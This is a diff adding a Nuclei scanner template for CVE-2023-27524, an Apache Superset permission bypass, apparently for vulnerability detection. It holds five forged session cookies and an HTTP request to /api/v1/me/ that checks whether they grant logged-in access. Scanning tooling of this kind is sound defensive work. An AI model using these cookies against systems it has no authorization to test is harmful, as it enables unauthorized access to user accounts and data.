@@ -1,0 +1,42 @@
+id: cve-2023-27524
+info:
+  name: Apache Superset Permission Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Apache Superset versions 2.0.1 and earlier are vulnerable to a permission bypass vulnerability. Attackers can exploit this issue to gain unauthorized access to resources.
+  reference:
+    - https://lists.apache.org/thread/n0ftx60sllf527j7g11kmt24wvof8xyk
+  classification:
+    cve-id: CVE-2023-27524
+    cvss-score: 8.9
+
+variables:
+  secret_sessions:
+    - "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.RoFeMf1WLNJXDYslf18x9VGxC0Q"
+    - "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.hKV8XXVcD6lWhTIoWs0CjrSRPQQ"
+    - "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.xtJXBhmJ0k6_oKs8iGhWJK2BjKs"
+    - "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.hRZP41FgqxjaxjJ3WyeIVxyZDng"
+    - "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.6GpaUB9IP9OnG3HHon3XcdzHWhI"
+
+http:
+  - raw:
+      - |
+        GET /api/v1/me/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session={{secret_sessions}}
+
+    headers:
+      User-Agent: Nuclei-Scanner
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"result\":"
+          - "\"email\":"
+          - "\"username\":"
+        part: body
